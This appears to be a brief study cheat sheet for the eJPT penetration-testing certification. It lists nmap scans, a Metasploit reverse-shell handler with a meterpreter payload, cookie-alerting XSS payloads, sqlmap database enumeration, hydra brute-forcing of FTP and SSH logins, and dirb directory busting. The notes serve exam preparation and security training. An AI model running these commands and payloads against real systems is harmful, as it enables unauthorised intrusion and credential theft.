# ejpt-cheet-sheet
Wireshark:

TCP:
```right click on it then click on Follow then click on TCP streem```

UDP:
```right click on it then click on Follow then click on UDP streem```


|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

Nmap:
```nmap -sn [the ip]/24 -oN file.txt
nmap scan types

-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Port Scan
-sV: Service Version information
-O: Operating System information```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

Mataspolite:
```search (the payload name)

use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp # the payload
set RHOST           # the target host
run
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

xss:
```
<script>alert(document.cookie)</script>
><img src=x onerror=alert(1)>
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

finding ip's from websites:
```dig exampil.com

ip route add 192.168.10.0/24 via 10.175.3.1 -- اذا حبينا نضيف الجهاز المخفي```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

sqlmap:
```sqlmap -u ‘http://example.com/view.php?id=1141’ -p id
-u    == url
-p    == paramater
sqlmap -u "http://example.com/view.php?id=1141" --dbs == to get the database name```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

hydra:
```hydra -L users.txt -P pass.txt <service://server> 
hydra -l admin -P pass.txt -f ftp://10.10.10.10
hydra -l root -P pass.txt 192.168.1.105 -t 4 ssh
hydra -l root -P pass.txt <ssh ip>  ssh
ftp <IP>        # enter 'anonymous' as username and password
```

|---------------------------------------------------------------------|
|                                                                     |
|---------------------------------------------------------------------|

drip:
```dirb http://<IP>/
dirb http://<IP>/ <dictionary_file_path>    # Use dictionary other than default one
dirb http://<IP>/dir -u admin:admin    # When you want to bust recursively but a dir asks for username password which you know already
```
